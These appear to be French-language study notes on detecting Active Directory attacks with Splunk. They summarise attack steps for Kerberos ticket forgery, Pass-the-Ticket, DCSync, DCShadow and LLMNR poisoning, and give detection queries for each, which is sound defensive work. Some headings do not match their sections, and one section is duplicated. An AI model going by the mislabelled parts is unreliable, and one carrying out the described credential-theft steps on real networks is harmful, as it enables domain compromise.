index=main earliest=1690280680 latest=1690289489 source="WinEventLog:Security" EventCode=4625
| bin span=15m time
| stats values(user) as Users, dc(user) as dcuser by src, SourceNetworkAddress, dest, EventCode, FailureReason
Explication des composants de la requ√™te
Filtrage par Index, Source et Code d'√âv√©nement :
Cette partie de la requ√™te se concentre sur les √©v√©nements du journal de s√©curit√© (WinEventLog:Security) avec EventCode=4625, repr√©sentant les √©checs de connexion.
Filtre de plage horaire :
La recherche est limit√©e √† une plage horaire sp√©cifique, d√©finie par les horodatages Unix, afin de filtrer uniquement les journaux pertinents.
Binning du temps :
La commande bin regroupe les √©v√©nements par intervalles de 15 minutes, ce qui aide √† d√©tecter les motifs en observant les tentatives de connexion √©chou√©es sur des p√©riodes courtes.
Agr√©gation des statistiques :
La commande stats agr√®ge les √©v√©nements par champs cl√©s pour analyser les √©checs de connexion sur diff√©rents comptes.
values(user) as Users : Liste tous les utilisateurs uniques associ√©s aux tentatives de connexion √©chou√©es.
dc(user) as dcuser : Compte le nombre d'utilisateurs distincts dans chaque groupe pour identifier plusieurs comptes cibl√©s depuis une seule adresse IP.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Responder-like Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8057-85f4-ca2f62947f97"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d'ensemble du Poisoning LLMNR/NBT-NS/mDNS

LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) et mDNS (Multicast DNS) sont des protocoles de r√©solution de noms utilis√©s lorsque DNS √©choue. Ces protocoles sont vuln√©rables aux attaques de spoofing et de poisoning, souvent r√©alis√©es avec des outils comme Responder. L'attaquant r√©pond aux requ√™tes de noms non r√©solus, capturant ainsi le NetNTLM hash de la victime, ce qui peut permettre des compromis suppl√©mentaires des syst√®mes.

Opportunit√©s de d√©tection des attaques de type Responder
Surveiller le trafic LLMNR et NBT-NS pour des comportements anormaux (par exemple, un grand nombre de requ√™tes).
Utiliser des techniques de type honeypot pour d√©tecter des r√©ponses r√©ussies pour des h√¥tes inexistants.
Utiliser des scripts PowerShell pour d√©tecter les r√©ponses inattendues LLMNR ou NBT-NS.
Exemple de script PowerShell pour la d√©tection :

New-EventLog -LogName Application -Source LLMNRDetection
Write-EventLog -LogName Application -Source LLMNRDetection -EventId 19001 -Message $msg -EntryType Warning
D√©tection des attaques de type Responder avec Splunk
Plage horaire :
Le plus t√¥t : 1690290078
Le plus tard : 1690291207
Requ√™tes Splunk
D√©tection des alertes LLMNR :

index=main earliest=1690290078 latest=1690291207 SourceName=LLMNRDetection
| table time, ComputerName, SourceName, Message
Suivi des requ√™tes DNS (Sysmon Event ID 22) :

index=main earliest=1690290078 latest=1690291207 EventCode=22 
| table time, Computer, user, Image, QueryName, QueryResults
Event ID 4648 - Connexions explicites vers des partages malveillants :

index=main earliest=1690290814 latest=1690291207 EventCode IN (4648) 
| table time, EventCode, source, name, user, TargetServerName, Message
| sort 0 time
Ces requ√™tes aident √† suivre les activit√©s suspectes li√©es aux requ√™tes LLMNR, NBT-NS et DNS, permettant ainsi une d√©tection pr√©coce des attaques de poisoning et des tentatives de vol de cr√©dentiels.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Kerberoasting &amp; AS-REProasting</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8074-b151-cf65a4e3de87"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">E. D√©tection de Golden Ticket via Splunk

Cette requ√™te Splunk permet de d√©tecter une activit√© suspecte li√©e √† des Golden Tickets, en identifiant les demandes de tickets de service (TGS) qui ne sont pas pr√©c√©d√©es par les √©tapes classiques d‚Äôauthentification Kerberos (AS-REQ / AS-REP). Ce type de comportement peut indiquer l‚Äôutilisation d‚Äôun TGT forg√© par un attaquant.

Requ√™te Splunk

index="goldenticketattack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin time span=1m
| stats count as totalrequests, values(client), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
| where totalrequests &gt; 10 AND uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
Explication de la requ√™te
S√©lection des donn√©es
index="goldenticketattack" : Recherche dans l‚Äôindex d√©di√© √† la d√©tection des attaques Golden Ticket.
sourcetype="bro:kerberos:json" : Utilise les logs Kerberos fournis par Zeek/Bro au format JSON.
Filtrage du client
where client!="-‚Äù : √âcarte les √©v√©nements o√π le champ client est vide ou absent.
Regroupement temporel
bin time span=1m : Regroupe les √©v√©nements par minute pour d√©tecter des rafales de requ√™tes suspectes.
Agr√©gation
stats count as totalrequests : Nombre total de requ√™tes par groupe.
values(requesttype) : Types de requ√™tes observ√©s (ex. TGS, AS-REQ).
dc(requesttype) : Nombre de types distincts de requ√™tes.
id.origh / id.resph : IP source (client) et IP destination (souvent le contr√¥leur de domaine).
Filtrage comportemental
totalrequests &gt; 10 : Se concentre sur les clients envoyant beaucoup de requ√™tes dans un court laps de temps.
uniquerequesttypes == 1 et requesttypes == "TGS" : Signale les cas o√π seule la demande de TGS est pr√©sente, sans trace d‚ÄôAS-REQ/AS-REP.

Interpr√©tation
Un client qui envoie uniquement des requ√™tes de type TGS sans aucune authentification pr√©alable est hautement suspect. Cela peut signifier que l‚Äôattaquant a inject√© un Golden Ticket, lui permettant d‚Äôacc√©der directement aux services sans s‚Äôauthentifier aupr√®s du KDC.

√Ä investiguer
Adresse IP source (id.origh) : Est-ce une machine autoris√©e ?
Fr√©quence : Ce comportement se r√©p√®te-t-il dans plusieurs intervalles ?
IP destination (id.resp_h) : Correspond-elle √† un contr√¥leur de domaine ?
Client ou utilisateur : S‚Äôagit-il d‚Äôun service connu ou d‚Äôun compte anormal ?</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Pass-the-Hash</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-808a-b87f-e4f20e96ea7b"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aper√ßu de l'attaque Overpass-the-Hash (Pass-the-Key)

Overpass-the-Hash (Pass-the-Key) permet aux attaquants de s'authentifier via Kerberos en utilisant des hashs de mots de passe vol√©s, leur permettant ainsi de demander des TGT (Ticket Granting Ticket) Kerberos et d'obtenir un acc√®s non autoris√© aux syst√®mes sans avoir recours √† NTLM.
√âtapes de l'attaque
Extraction des hash des utilisateurs : L'attaquant utilise des outils comme Mimikatz pour obtenir le hash NTLM d'un utilisateur connect√©, n√©cessitant des privil√®ges d'administrateur local.
Demande de TGT avec Rubeus : L'attaquant utilise Rubeus pour cr√©er une requ√™te brute AS-REQ pour un TGT d'un utilisateur sp√©cifi√©. Cette √©tape ne n√©cessite pas de privil√®ges √©lev√©s, la rendant plus discr√®te.
Soumission du Ticket : L'attaquant injecte le TGT demand√© dans la session en cours, de mani√®re similaire √† l'attaque Pass-the-Ticket, pour effectuer des mouvements lat√©raux.

Opportunit√©s de d√©tection de l'attaque Overpass-the-Hash
Logique de d√©tection cl√©
D√©tection de Mimikatz : Les artefacts d'attaques Overpass-the-Hash bas√©es sur Mimikatz ressemblent √† ceux des attaques Pass-the-Hash et peuvent √™tre d√©tect√©s √† l'aide de techniques similaires.
D√©tection de Rubeus : Lorsque Rubeus envoie une requ√™te AS-REQ directement au contr√¥leur de domaine via le port TCP/UDP 88, cela g√©n√®re l'Event ID 4768. Cependant, des processus inhabituels communiquant sur le port 88 vers le contr√¥leur de domaine, autre que lsass.exe, peuvent aider √† identifier l'activit√© potentielle d'Overpass-the-Hash.

Exemple de requ√™te Splunk : D√©tection de Rubeus dans l'attaque Overpass-the-Hash

Description : Cette requ√™te identifie les requ√™tes AS-REQ envoy√©es sur le port 88 provenant de processus inhabituels, en recherchant sp√©cifiquement l'Event ID 3 avec un port de destination √©gal √† 88, tout en excluant lsass.exe.

Plage horaire : earliest=1690443407 latest=1690443544

index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 destport=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by processid
| where EventCode=3
| stats count by time, Computer, destip, destport, Image, process
| fields - count
Explication des composants cl√©s de la requ√™te
Filtrage des √©v√©nements :
S√©lection de la source : Filtre les √©v√©nements provenant du journal op√©rationnel de Sysmon (XmlWinEventLog:Microsoft-Windows-Sysmon/Operational).
EventCode 3 : Capture les connexions r√©seau effectu√©es par l'h√¥te, ciblant sp√©cifiquement le trafic vers destport=88 (Kerberos), en excluant Image=lsass.exe, car il s'agit d'un processus l√©gitime acc√©dant aux services Kerberos.
OR EventCode 1 : Capture tous les √©v√©nements de cr√©ation de processus pour permettre une corr√©lation avec d'autres √©v√©nements li√©s aux processus suspects.
Statistiques des √©v√©nements :
EventStats : Ajoute la liste des processus pour chaque identifiant de processus (processid), stock√©e sous process.
Where EventCode=3 : Filtre pour les √©v√©nements de connexion r√©seau sur le port 88.
Agr√©gation et filtrage :
Stats count by Fields : Agr√®ge les √©v√©nements par time, Computer, destip, destport, Image, et process, tout en calculant le nombre d‚Äôoccurrences (count).
Fields - count : Supprime le champ count du r√©sultat final pour plus de clart√©.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Pass-the-Ticket</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8076-ab05-c7f72eadbb99"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aper√ßu de l'attaque Pass-the-Ticket (PtT)

Pass-the-Ticket (PtT) est une technique permettant aux attaquants de se d√©placer lat√©ralement dans un r√©seau en utilisant des tickets Kerberos au lieu de mots de passe. Avec des privil√®ges administratifs, un attaquant peut extraire des tickets Kerberos valides (TGT ou TGS) de la m√©moire d'un syst√®me compromis et les utiliser pour acc√©der √† des ressources sans avoir besoin du mot de passe de l'utilisateur.
√âtapes de l'attaque Pass-the-Ticket :
Extraction des tickets Kerberos : L'attaquant utilise des outils comme Mimikatz pour extraire des tickets TGT ou TGS d'un syst√®me compromis.
Authentification avec le ticket extrait : L'attaquant soumet le ticket dans la session de connexion en cours, s'authentifiant en tant qu'utilisateur sans avoir besoin du mot de passe.
Mouvement lat√©ral : En utilisant le ticket, l'attaquant peut acc√©der √† des syst√®mes ou ressources suppl√©mentaires sur le r√©seau.
Processus d'authentification Kerberos &amp; √©v√©nements de s√©curit√© associ√©s √† Windows
Event ID 4624 : Connexion r√©ussie √† un syst√®me.
Event ID 4648 : Tentative de connexion explicite avec des informations d'identification.
Event ID 4672 : Connexion sp√©ciale, indiquant des privil√®ges administratifs.
Event ID 4768 : Demande de TGT dans le processus Kerberos.
Event ID 4769 : Demande de TGS dans le processus Kerberos.
Event ID 4770 : Renouvellement de ticket TGS.
Opportunit√©s de d√©tection de l'attaque Pass-the-Ticket
Logique cl√© de d√©tection

La d√©tection des attaques PtT n√©cessite de surveiller les demandes de tickets de service Kerberos (TGS) √©mises sans une demande pr√©alable de TGT. Les attaquants peuvent importer un TGT directement dans une session, cr√©ant ainsi un √©cart o√π une demande de TGS (Event ID 4769) ou un renouvellement de ticket (Event ID 4770) n'a pas de demande TGT associ√©e (Event ID 4768). Surveiller les incoh√©rences dans le processus d'authentification peut permettre de rep√©rer les tentatives PtT.

Exemple 1 : D√©tection des demandes de tickets TGS sans demande pr√©alable de TGT

Description : Cette requ√™te recherche les demandes de tickets de service Kerberos (4769) et les renouvellements (4770) sans demande pr√©alable de TGT (4768) provenant du m√™me syst√®me, ce qui peut indiquer un TGT import√©.

Plage horaire : earliest=1690392405 latest=1690451745

index=main earliest=1690392405 latest=1690451745 source="WinEventLog:Security" user!=$ EventCode IN (4768,4769,4770)
| rex field=user "(?&lt;username&gt;[^@]+)"
| rex field=srcip "(\:\:ffff\:)?(?&lt;srcip4&gt;[0-9\.]+)"
| transaction username, srcip4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closedtxn=0
| search NOT user="$@"
| table time, ComputerName, username, srcip4, servicename, category
Explication des composants cl√©s
Filtrage des √©v√©nements :
S√©lection des √©v√©nements : Filtre les √©v√©nements pour inclure uniquement les Event IDs 4768, 4769 et 4770 dans le journal de s√©curit√©, en excluant les comptes machines (user!=$).
Expressions r√©guli√®res :
Extraction du nom d'utilisateur : Extrait le nom d'utilisateur du champ user pour une identification plus facile.
Extraction de l'IP : Extrait les adresses IPv4 de srcip, en tenant compte des adresses IPv6 mapp√©es sur IPv4 en se concentrant sur la portion IPv4.
Commande transaction :
But : Groupe les √©v√©nements associ√©s par username et srcip4, en commen√ßant avec EventCode 4768 (demande de TGT).
Param√®tres : maxspan=10h d√©finit une fen√™tre de transaction maximale de 10 heures, permettant des sessions de connexion longues ; keepevicted=true garantit que les transactions ouvertes restent visibles.
Filtrage pour transactions ouvertes :
closed\txn=0 : Filtre les transactions sans √©v√©nement de cl√¥ture, ce qui montre les cas o√π des tickets TGS ou des renouvellements ont √©t√© demand√©s sans une demande de TGT pr√©alable.
Affichage des r√©sultats :
Affiche des champs pertinents comme time, ComputerName, username, srcip4, servicename, et category pour faciliter l'analyse.

Exemple 2 : D√©tection des demandes TGS et comportements anormaux

Dans les cas o√π des attaquants importent des tickets TGS sans demande TGT valide, des anomalies peuvent appara√Ætre dans Event ID 4771 (√âchec de pr√©-authentification). En surveillant les incoh√©rences dans les codes d'√©chec et les types d'authentification, des attaques PtT suppl√©mentaires peuvent √™tre d√©tect√©es.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Overpass-the-Hash </strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80fb-ac1f-fddb988234dd"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Aper√ßu de l'attaque Overpass-the-Hash (Pass-the-Key)

Overpass-the-Hash (Pass-the-Key) permet aux attaquants de s'authentifier via Kerberos en utilisant des hashs de mots de passe vol√©s, leur permettant ainsi de demander des TGT (Ticket Granting Ticket) Kerberos et d'obtenir un acc√®s non autoris√© aux syst√®mes sans avoir recours √† NTLM.
√âtapes de l'attaque
Extraction des hash des utilisateurs : L'attaquant utilise des outils comme Mimikatz pour obtenir le hash NTLM d'un utilisateur connect√©, n√©cessitant des privil√®ges d'administrateur local.
Demande de TGT avec Rubeus : L'attaquant utilise Rubeus pour cr√©er une requ√™te brute AS-REQ pour un TGT d'un utilisateur sp√©cifi√©. Cette √©tape ne n√©cessite pas de privil√®ges √©lev√©s, la rendant plus discr√®te.
Soumission du Ticket : L'attaquant injecte le TGT demand√© dans la session en cours, de mani√®re similaire √† l'attaque Pass-the-Ticket, pour effectuer des mouvements lat√©raux.

Opportunit√©s de d√©tection de l'attaque Overpass-the-Hash
Logique de d√©tection cl√©
D√©tection de Mimikatz : Les artefacts d'attaques Overpass-the-Hash bas√©es sur Mimikatz ressemblent √† ceux des attaques Pass-the-Hash et peuvent √™tre d√©tect√©s √† l'aide de techniques similaires.
D√©tection de Rubeus : Lorsque Rubeus envoie une requ√™te AS-REQ directement au contr√¥leur de domaine via le port TCP/UDP 88, cela g√©n√®re l'Event ID 4768. Cependant, des processus inhabituels communiquant sur le port 88 vers le contr√¥leur de domaine, autre que lsass.exe, peuvent aider √† identifier l'activit√© potentielle d'Overpass-the-Hash.

Exemple de requ√™te Splunk : D√©tection de Rubeus dans l'attaque Overpass-the-Hash

Description : Cette requ√™te identifie les requ√™tes AS-REQ envoy√©es sur le port 88 provenant de processus inhabituels, en recherchant sp√©cifiquement l'Event ID 3 avec un port de destination √©gal √† 88, tout en excluant lsass.exe.

Plage horaire : earliest=1690443407 latest=1690443544

index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 destport=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by processid
| where EventCode=3
| stats count by time, Computer, destip, destport, Image, process
| fields - count
Explication des composants cl√©s de la requ√™te
Filtrage des √©v√©nements :
S√©lection de la source : Filtre les √©v√©nements provenant du journal op√©rationnel de Sysmon (XmlWinEventLog:Microsoft-Windows-Sysmon/Operational).
EventCode 3 : Capture les connexions r√©seau effectu√©es par l'h√¥te, ciblant sp√©cifiquement le trafic vers destport=88 (Kerberos), en excluant Image=lsass.exe, car il s'agit d'un processus l√©gitime acc√©dant aux services Kerberos.
OR EventCode 1 : Capture tous les √©v√©nements de cr√©ation de processus pour permettre une corr√©lation avec d'autres √©v√©nements li√©s aux processus suspects.
Statistiques des √©v√©nements :
EventStats : Ajoute la liste des processus pour chaque identifiant de processus (processid), stock√©e sous process.
Where EventCode=3 : Filtre pour les √©v√©nements de connexion r√©seau sur le port 88.
Agr√©gation et filtrage :
Stats count by Fields : Agr√®ge les √©v√©nements par time, Computer, destip, destport, Image, et process, tout en calculant le nombre d‚Äôoccurrences (count).
Fields - count : Supprime le champ count du r√©sultat final pour plus de clart√©.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Golden Tickets and Silver Tickets</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-806e-8d28-e7f298065107"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Golden Ticket

Une attaque Golden Ticket consiste √† forger un Ticket Granting Ticket (TGT) pour usurper l‚Äôidentit√© d‚Äôun administrateur de domaine et acc√©der librement √† l‚Äôensemble du domaine. Cette attaque est difficile √† d√©tecter, car le ticket g√©n√©r√© est techniquement valide et peut √™tre cr√©√© hors ligne par un attaquant.
√âtapes de l‚Äôattaque
Extraction du hash KRBTGT : L‚Äôattaquant r√©cup√®re le hash NTLM du compte KRBTGT, souvent via une attaque DCSync ou en extrayant les fichiers NTDS.dit et LSASS.
Cr√©ation du TGT falsifi√© : √Ä l‚Äôaide de ce hash, l‚Äôattaquant forge un TGT lui attribuant des privil√®ges d‚Äôadministrateur du domaine.
Injection du TGT : Ce ticket est inject√© dans une session utilisateur, permettant un acc√®s non autoris√© aux ressources du domaine.
Opportunit√©s de d√©tection

La d√©tection repose sur certains indicateurs tels que :
Activit√© DCSync suspecte : surveiller les requ√™tes DCSync non l√©gitimes.
Acc√®s √† NTDS.dit ou LSASS : l‚Äô√©v√©nement Sysmon ID 10 peut alerter sur un acc√®s √† LSASS pour l‚Äôextraction de hash.
Alertes Pass-the-Ticket : l‚Äôutilisation d‚Äôun Golden Ticket ressemble √† des comportements Pass-the-Ticket.

Exemple de requ√™te Splunk : D√©tection d‚Äôun Golden Ticket

Description : Cette recherche identifie l‚Äôutilisation potentielle d‚Äôun Golden Ticket en d√©tectant des tickets Kerberos (4769 ou 4770) qui n‚Äôont pas d‚Äô√©v√©nement initial 4768 (AS-REQ), ce qui peut indiquer qu‚Äôils ont √©t√© forg√©s.

Plage temporelle : earliest=1690451977 latest=1690452262

index=main earliest=1690451977 latest=1690452262 source="WinEventLog:Security" user!=$ EventCode IN (4768,4769,4770)
| rex field=user "(?&lt;username&gt;[^@]+)"
| rex field=srcip "(\:\:ffff\:)?(?&lt;srcip4&gt;[0-9\.]+)"
| transaction username, srcip4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closedtxn=0
| search NOT user="$@*"
| table time, ComputerName, username, srcip4, servicename, category
Silver Ticket

Une attaque Silver Ticket permet de forger des tickets de service (TGS) pour acc√©der √† des services sp√©cifiques (par exemple, SQL Server) sans authentification compl√®te aupr√®s du contr√¥leur de domaine. Elle donne un acc√®s plus limit√© que le Golden Ticket mais reste redoutable.
√âtapes de l‚Äôattaque
Extraction du hash du compte de service : L‚Äôattaquant r√©cup√®re le hash NTLM d‚Äôun compte de service cible.
Cr√©ation d‚Äôun TGS falsifi√© : Il forge un ticket de service avec ce hash.
Injection et acc√®s : Le ticket est inject√© dans une session pour acc√©der au service vis√©.
Opportunit√©s de d√©tection

Les indicateurs cl√©s incluent :
Cr√©ation de nouveaux comptes utilisateurs : l‚Äô√©v√©nement ID 4720 peut alerter sur des comptes r√©cemment cr√©√©s.
Attribution de privil√®ges sp√©ciaux : l‚Äô√©v√©nement ID 4672 permet de d√©tecter des connexions avec des droits √©lev√©s.

Exemples de requ√™tes Splunk pour d√©tecter les Silver Tickets
Requ√™te 1 : Comparaison entre utilisateurs cr√©√©s et utilisateurs connect√©s

Objectif : Identifier les comptes utilisateurs r√©cemment cr√©√©s qui se connectent sans √™tre attendus.

Extraction des utilisateurs cr√©√©s :

index=main latest=1690448444 EventCode=4720
| stats min(time) as time, values(EventCode) as EventCode by user
| outputlookup users.csv
Comparaison avec les connexions r√©centes :

Plage temporelle : latest=1690545656

index=main latest=1690545656 EventCode=4624
| stats min(time) as firstTime, values(ComputerName) as ComputerName, values(EventCode) as EventCode by user
| eval last24h = 1690451977
| where firstTime &gt; last24h
| convert ctime(firstTime)
| convert ctime(last24h)
| lookup users.csv user as user OUTPUT EventCode as Events
| where isnull(Events)
Requ√™te 2 : D√©tection de privil√®ges sp√©ciaux sur des connexions r√©centes

Objectif : Identifier des comptes ayant obtenu des privil√®ges √©lev√©s r√©cemment, possiblement via un Silver Ticket.

Plage temporelle : latest=1690545656

index=main latest=1690545656 EventCode=4672
| stats min(time) as firstTime, values(ComputerName) as ComputerName by AccountName
| eval last24h = 1690451977
| where firstTime &gt; last24h
| table firstTime, ComputerName, AccountName
| convert ctime(firstTime)
R√©sum√©

Les attaques Golden Ticket et Silver Ticket tirent parti des failles du protocole Kerberos pour obtenir un acc√®s non autoris√© √† un environnement Active Directory. La d√©tection repose sur la corr√©lation d‚Äô√©v√©nements li√©s aux connexions, √† la cr√©ation de comptes et √† l‚Äô√©l√©vation de privil√®ges. L‚Äôutilisation de Splunk pour surveiller ces indicateurs permet aux √©quipes de s√©curit√© de rep√©rer et de r√©agir plus efficacement √† ces menaces avanc√©es.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Unconstrained Delegation and Constrained Delegation Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-809a-828c-d95f8103505c"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©l√©gation non contrainte

La d√©l√©gation non contrainte permet √† un service de s'authentifier aupr√®s d'autres ressources au nom de n'importe quel utilisateur, exposant ainsi des donn√©es sensibles en cas de compromission. Les attaquants peuvent exploiter cette vuln√©rabilit√© pour extraire les tickets TGT de la m√©moire et se d√©placer lat√©ralement dans le r√©seau.
√âtapes de l'attaque :
Identifier les syst√®mes avec la d√©l√©gation non contrainte activ√©e.
Acc√©der √† un syst√®me vuln√©rable.
Extraire les TGT √† l‚Äôaide d‚Äôoutils comme Mimikatz.
Opportunit√©s de d√©tection :
Commandes PowerShell : La surveillance des journaux PowerShell (Event ID 4104) peut r√©v√©ler des commandes li√©es √† la d√©couverte de la d√©l√©gation non contrainte.
Requ√™tes LDAP : Analyser les journaux pour d√©tecter des requ√™tes LDAP concernant les param√®tres de d√©l√©gation.
R√©utilisation de TGT : Les d√©tections Pass-the-Ticket peuvent signaler l‚Äôutilisation des TGT.
Exemple de requ√™te Splunk :

index=main earliest=1690544538 latest=1690544540 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="TrustedForDelegation" OR Message="userAccountControl:1.2.840.113556.1.4.803:=524288" 
| table time, ComputerName, EventCode, Message
D√©l√©gation contrainte

La d√©l√©gation contrainte restreint la d√©l√©gation √† des services sp√©cifiques, permettant √† un service d'agir au nom d'un utilisateur uniquement pour des ressources d√©finies. Cependant, des attaquants peuvent exploiter cette fonctionnalit√© via les extensions S4U pour s‚Äôimpliquer dans des attaques de type Pass-the-Ticket.
√âtapes de l'attaque :
Identifier les comptes avec msDS-AllowedToDelegateTo.
Extraire le TGT d‚Äôun principal.
Utiliser les techniques S4U2self et S4U2proxy pour imiter des comptes privil√©gi√©s.
Acc√©der aux ressources en tant qu'utilisateur cible.
Opportunit√©s de d√©tection :
Requ√™tes LDAP et PowerShell : Surveiller les commandes qui recherchent msDS-AllowedToDelegateTo.
Trafic Kerberos : Analyser le trafic inhabituel sur le port 88 (Kerberos).
Exemple de requ√™te Splunk pour la d√©couverte de la d√©l√©gation contrainte via PowerShell :

index=main earliest=1690544553 latest=1690562556 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 Message="msDS-AllowedToDelegateTo" 
| table time, ComputerName, EventCode, Message
Exemple de requ√™te Splunk pour la d√©tection avec les logs Sysmon :

index=main earliest=1690562367 latest=1690562556 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
| eventstats values(process) as process by processid
| where EventCode=3 AND destport=88
| table time, Computer, destip, dest_port, Image, process</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting DCSync &amp; DCShadow</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80da-be5d-f82ee85d7302"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">DCSync

DCSync est une technique permettant √† un attaquant d‚Äôimiter un contr√¥leur de domaine pour obtenir les donn√©es de r√©plication d‚ÄôActive Directory, notamment les hashs de mots de passe (actuels et anciens). Cette attaque peut ensuite servir √† :
Forger des Golden Tickets ou Silver Tickets
R√©aliser des attaques de type Pass-the-Hash
√âtapes de l'attaque
Acc√®s Administratif : L‚Äôattaquant obtient un acc√®s administrateur sur une machine li√©e au domaine ou √©l√®ve ses privil√®ges.
Demande de R√©plication : √Ä l‚Äôaide d‚Äôoutils comme Mimikatz, l‚Äôattaquant utilise l‚Äôinterface DRSGetNCChanges pour demander la r√©plication.
Exploitation des Hashs : Les donn√©es extraites sont utilis√©es pour forger des tickets Kerberos ou compromettre d‚Äôautres comptes.
Opportunit√©s de d√©tection
√âv√©nement Windows ID 4662 : Enregistre les op√©rations de type DS-Replication-Get-Changes, essentielles pour d√©tecter les activit√©s DCSync.
Configuration de l'audit : L'audit avanc√© des acc√®s au service d'annuaire doit √™tre activ√© (d√©sactiv√© par d√©faut).

Requ√™te Splunk ‚Äì D√©tection de DCSync (Event ID 4662)

Description : Cette requ√™te d√©tecte les tentatives de r√©plication en recherchant la propri√©t√© "Replicating Directory Changes" dans les √©v√©nements 4662.

Plage temporelle : earliest=1690544278 latest=1690544280

index=main earliest=1690544278 latest=1690544280 EventCode=4662 Message="Replicating Directory Changes"
| rex field=Message "(?P&lt;property&gt;Replicating Directory Changes.)"
| table time, user, objectfilename, ObjectServer, property
DCShadow

DCShadow est une attaque plus avanc√©e permettant √† un attaquant de cr√©er des modifications non autoris√©es dans Active Directory sans g√©n√©rer de journaux standard. Cela implique de cr√©er un faux contr√¥leur de domaine (rogue DC) qui r√©plique des changements malveillants vers les vrais contr√¥leurs de domaine.
√âtapes de l'attaque
Acc√®s √©lev√© : L‚Äôattaquant doit poss√©der des privil√®ges suffisants pour inscrire un contr√¥leur de domaine.
Enregistrement du DC rogue : Un faux contr√¥leur de domaine est inscrit et effectue des modifications AD (par exemple, ajouter un utilisateur au groupe "Domain Admins").
R√©plication des modifications : Ces modifications sont propag√©es via le m√©canisme de r√©plication AD.
Opportunit√©s de d√©tection
√âv√©nement ID 4742 : Enregistre les modifications des objets ordinateurs, y compris les changements de ServicePrincipalName (SPN).
Cr√©ation d‚Äôun objet nTDSDSA : Un ajout d‚Äôobjet nTDSDSA dans le sch√©ma AD est souvent un indicateur d‚Äôune activit√© DCShadow.

Requ√™te Splunk ‚Äì D√©tection de DCShadow (Event ID 4742)

Description : Cette requ√™te d√©tecte les modifications suspectes des comptes ordinateurs via des changements sur les ServicePrincipalNames, li√©s √† l'activit√© DCShadow.

Plage temporelle : earliest=1690623888 latest=1690623890

index=main earliest=1690623888 latest=1690623890 EventCode=4742 
| rex field=Message "(?P&lt;gcspn&gt;XX\/[a-zA-Z0-9\.\-\/]+)" 
| table time, ComputerName, SecurityID, Account_Name, user, gcspn 
| search gcspn=
R√©sum√©

Les attaques DCSync et DCShadow repr√©sentent des menaces s√©rieuses dans un environnement Active Directory. Leur d√©tection repose sur la surveillance d'√©v√©nements pr√©cis (comme les ID 4662 et 4742) et la corr√©lation de comportements anormaux sur les objets du domaine.

En mettant en place des politiques d‚Äôaudit avanc√©es et en exploitant des requ√™tes Splunk bien cibl√©es, les √©quipes de s√©curit√© peuvent significativement am√©liorer leurs capacit√©s de d√©tection et de r√©ponse face √† ces techniques furtives.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Creating Custom Splunk Applications</summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80cd-9ba7-d433e90f3be9"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Cr√©ation d‚Äôune application personnalis√©e dans Splunk
√âtape 1 : Acc√©der √† Splunk Web
Ouvrez votre navigateur web et connectez-vous √† Splunk Web.
√âtape 2 : Acc√©der √† la gestion des applications
Dans le menu Applications en haut de la page, cliquez sur G√©rer les applications.
√âtape 3 : Cr√©er une nouvelle application
Sur la page des applications, cliquez sur Cr√©er une application.
Remplissez les champs suivants :
Nom : Entrez le nom de l‚Äôapplication, par exemple D√©tection d'attaques Active Directory.
Nom du dossier : Indiquez un nom similaire, par exemple ADAttackDetection. Ce dossier sera cr√©√© sous $SPLUNKHOME/etc/apps/.
Version : Entrez la version initiale, par exemple 1.0.0.
Description : Ajoutez une br√®ve description, par exemple Application de d√©tection des attaques Active Directory.
Mod√®le : Choisissez barebones dans la liste d√©roulante.
